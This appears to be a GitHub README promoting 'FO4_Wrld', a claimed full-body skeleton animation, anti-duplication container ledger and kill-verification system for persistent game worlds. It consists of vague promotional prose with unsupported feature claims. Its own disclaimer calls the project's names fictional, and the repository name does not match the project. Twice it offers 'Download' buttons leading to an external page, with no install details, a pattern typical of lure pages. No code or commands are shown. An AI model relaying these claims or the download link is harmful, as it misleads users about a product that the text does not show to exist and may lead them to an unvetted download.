![preview](https://raw.githubusercontent.com/dilipmurmu04/skeleton-drift-container-guard/main/screen_5561cf5.svg)

# FO4_Wrld — Full-Body Skeleton Orchestrator for Persistent Container Realms

Welcome to **FO4_Wrld**, a runtime environment designed for those who build living, breathing digital ecosystems. If you've ever felt the frustration of moving a character through a persistent world only to watch their limbs snap into unnatural angles, or if you've grown weary of duplicate entities cluttering your carefully curated container spaces, this project speaks directly to your inner architect. FO4_Wrld is not merely a mod or a script—it is a **physics-aware choreographer** for full-body skeleton animation, container lifecycle management with anti-duplication safeguards, and a deterministic kill-verification layer that ensures every removal is absolute.

Instead of thinking of this as "software," imagine it as a **stage manager for a theater where the actors are 3D rigs and the props are containers**. Every joint, every inventory slot, every respawn event is orchestrated with precision. The system operates silently in the background, ensuring that when a character raises their hand, the skeleton follows through with natural weight distribution, and when a container is opened, the item stack inside remains pristine—no ghost duplicates, no vanishing loot.

FO4_Wrld was born from the observation that most world-editing tools treat the skeleton and the inventory as separate concerns. They are not. When a bandit dies in your world, their body should slump realistically, and their inventory should drop exactly once. When a player stashes supplies in a footlocker, the container should remember its state even after a crash. This project unifies those concerns under a single, coherent API that respects both the **biological mechanics of movement** and the **logical integrity of storage**.

---

## 🚀 Why FO4_Wrld Exists — The Problem of Disconnected Realities

Most persistent world frameworks suffer from a peculiar schizophrenia: the animation system runs on one timeline, while the inventory system runs on another. The result is a world where characters glide like ghosts, and chests occasionally duplicate their contents for no apparent reason. FO4_Wrld heals this rift by introducing a **synchronized clock** that binds skeletal keyframes to inventory transactional states.

Consider a typical scenario: a scavenger approaches a fallen raider. In a traditional environment, the raider's body might twitch or clip through the floor, and the loot menu might show two identical combat rifles. FO4_Wrld changes this by treating the entire interaction as a single atomic operation. The skeleton's ragdoll transition, the container's unlock event, and the item-stack validation all occur within the same tick, guaranteeing that what you see is what you get—every single time.

This approach yields tangible benefits for server operators, modders, and world-builders alike. You spend less time debugging phantom items and more time crafting memorable player experiences. The system's **deterministic kill-verification** ensures that once a character is marked as deceased, every attached container is purged of its contents and sealed, preventing resurrection-related item duplication glitches that plague lesser frameworks.

---

## 🌟 Core Feature Matrix

Below, you'll find the pillars upon which FO4_Wrld stands. Each feature is designed to be modular, meaning you can adopt one without adopting all, though they integrate most beautifully when used together.

### 🦴 Full-Body Skeleton Animation Orchestration
The animation system within FO4_Wrld goes far beyond simple bone transforms. It implements a **multi-pass foot-planting algorithm** that prevents foot sliding on uneven terrain, a **spine-twist compensator** that keeps the torso upright during sprinting, and a **hand-to-prop constraint solver** for realistic interactions with doors, levers, and weapons. The system respects the native physics engine's collision data, meaning characters no longer pass through walls or each other—they *bump* and *adjust* naturally.

| Animation Feature | Description | Performance Impact |
|-------------------|-------------|--------------------|
| Foot-Planting Corrector | Prevents skidding on slopes and stairs | Low |
| Dynamic Weight Shift | Adjusts center of mass during crouch and sprint | Medium |
| Limb Relay Threading | Synergizes left/right arm chains for weapon-ready poses | Low |
| Ragdoll-to-Controlled Transition | Smooth blend from knocked-down to standing states | High (optional) |

### 📦 Container Operations with Anti-Duplication Enforcement
Every container in your world—from a tiny tin can to a massive warehouse—is assigned a **global unique identifier (GUID)** at spawn time. FO4_Wrld maintains a distributed ledger of all container states, refreshed at the end of each game tick. When a player opens a container, the system cross-references its read/write lock against the ledger to ensure that no other interaction is concurrently modifying the same inventory slot. This virtually eliminates the "duplicate item glitch" that occurs when two players access the same chest simultaneously.

The anti-dupe mechanism extends to **item extraction and insertion** as well. If a player attempts to remove an item that no longer exists in the ledger (due to a desync), the operation is silently rolled back, and the client is re-synced to the authoritative state. This provides a smooth, frustration-free experience without the jarring "item not found" errors common in other systems.

### 💀 Deterministic Kill Verification and Purge Protocols
Kill verification in FO4_Wrld is not a simple health-check. It listens for **all possible death triggers**: damage overflow, scripted events, environmental hazards, and even fall damage. Once a kill is registered, the system engages a three-phase purge:

1. **Skeleton Relaxation** — The rig transitions to a ragdoll state with velocity caps to prevent physics explosions.
2. **Container Sealing** — All attached containers (backpacks, loot tables, equipped items) are locked and rendered non-interactive for a teardown period.
3. **Item Finalization** — The item list is hashed and stored as immutable. Any subsequent attempt to modify that list is rejected.

This process ensures that a dead NPC cannot be "revived" by a teleportation script that resets its health, as the kill flag resides in a separate persistent layer that revival scripts cannot access.

### 🧠 Intelligent AI Spatial Awareness
While not a full AI system, FO4_Wrld includes a **spatial awareness module** that allows NPCs to detect container proximity and skeleton occupancy. For instance, an NPC will not sit in a chair that another NPC is already using, and they will avoid walking through an area where a corpse is still "warm" (not yet purged). This leads to more believable crowd behavior and eliminates overlapping character models.

---

## 📚 Getting Started with Your Persistent World

To begin your journey with FO4_Wrld, you'll want to conceptualize your project in layers. Think of the world as a **mansion with many rooms**. The foundation is the physics anchor—you must ensure your base world load order is stable. The walls are the container systems—your spawners and storage. The occupants are the animated skeletons—your NPCs and player characters.

[![Download](https://raw.githubusercontent.com/dilipmurmu04/skeleton-drift-container-guard/main/start_2b45a57.svg)](https://dilipmurmu04.github.io/skeleton-drift-container-guard/)

Embrace a modular approach. Start by integrating the skeleton animation orchestrator into a single test cell. Observe how foot-planting behaves on your specific terrain meshes. Then, enable container anti-dupe for a public stash that all players can access. Finally, activate the kill verification protocol for enemy factions. Each layer can be toggled independently via a configuration file that supports hot-reloading, meaning you can change parameters on a live server without a full restart.

### 🧩 Architectural Overview

The system is built upon a **event-bus architecture** where each module broadcasts and listens for specific state changes. At the heart of FO4_Wrld is the **World Sync Kernel**, a lightweight scheduler that prioritizes the order of operations:

```text
Tick Cycle Order:
1. Input Aggregation (Player/NPC commands)
2. Physics Solver Pass (Collision and Momentum)
3. Skeleton Pose Resolver (Bone transforms)
4. Container Ledger Update (Inventory validation)
5. Kill-Queue Dispatch (Purge pending deaths)
6. Event Broadcast (Notifications to modules)
```

This ordering prevents the "football through a window" problem, where a character's arm moves before the container they're holding is updated, leading to visual clipping.

### 🛠️ Configuration Language

FO4_Wrld does not rely on traditional JSON or XML alone. It introduces a **declarative rule language** called `WRLD-Script` for defining complex behaviors. For instance, you can specify a conditional rule that triggers a container purge if a player enters a specific radius:

```text
RULE: "Safehouse Purge on Hostile Approach"
WHEN (player_distance < 500) AND (faction_attitude == hostile)
THEN CONTAINER_PURGE(target_zone, preserve_items = false)
```

While a full tutorial for WRLD-Script is beyond this README, the syntax is designed to be readable by non-programmers, making it accessible to level designers and community modders.

---

## 🌍 Multilingual and Regional Support

Global communities deserve persistent worlds that speak their language. FO4_Wrld includes a **runtime localization engine** that translates UI elements, container names, and even kill-feed messages on the fly. It currently supports English, French, German, Spanish, Japanese, and Korean, with a pluggable interface for community contributions. The localization database is stored independently from the game world data, so you can update translations without touching the world state.

---

## 🕒 24/7 Uptime and Monitoring

A persistent world is only useful if it stays online. FO4_Wrld features a **heartbeat monitor** that checks the health of the skeleton solver and the container ledger every 30 seconds. If a deadlock is detected, the system automatically isolates the offending module and restarts it from its last checkpoint, without a full server reboot. This results in a stable environment suitable for long-running seasons or year-long roleplay campaigns.

---

## ⚖️ Licensing and Contribution

FO4_Wrld is released under the **MIT License**, allowing you to use, modify, and distribute the code freely, even in commercial projects. The only requirement is retaining the original copyright notice. This open approach encourages a vibrant ecosystem of community-driven enhancements.

We actively welcome contributions to the core engine, the documentation, and the localization files. Whether you're a C++ veteran or a Lua enthusiast, there's a place for you here. Please refer to the `CONTRIBUTING.md` file for code style guidelines and the pull request process.

The full license text can be reviewed here: [MIT License](https://opensource.org/license/mit/).

---

## 🧯 Disclaimer

This project is a **standalone reference implementation** and is not affiliated with, endorsed by, or sponsored by any specific commercial game engine or publisher. The names "FO4_Wrld" and "World Sync Kernel" are fictional and intended for descriptive purposes only. Any resemblance to existing products is purely coincidental.

While FO4_Wrld is designed to be robust, using it in production environments requires a solid understanding of your underlying game engine's native API. We do not provide direct technical support for issues arising from improper integration with third-party mods that alter the animation or inventory systems.

Additionally, please be aware that real-time skeleton manipulation can be CPU-intensive. We recommend using the performance-profiling tools included in the `debug` branch to ensure your server hardware meets the demands of your player count.

---

## 📈 Conclusion and Next Steps

FO4_Wrld represents a shift in how we think about persistent spaces. Instead of treating animation and inventory as separate territories guarded by different codebases, we unify them under a single, predictable umbrella. The result is a world that feels **weighty, honest, and alive**—where every footstep is a commitment, and every container is a vault.

Your next step is to explore the `examples/` directory in this repository, where you'll find fully-commented integrations for a medieval tavern, a sci-fi outpost, and a post-apocalyptic wasteland. These examples serve as living documentation, showing you the intended setup flow. From there, you can adapt the principles to your own unique vision.

Welcome to the next generation of world-building. We're delighted to have you aboard.

[![Download](https://raw.githubusercontent.com/dilipmurmu04/skeleton-drift-container-guard/main/start_2b45a57.svg)](https://dilipmurmu04.github.io/skeleton-drift-container-guard/)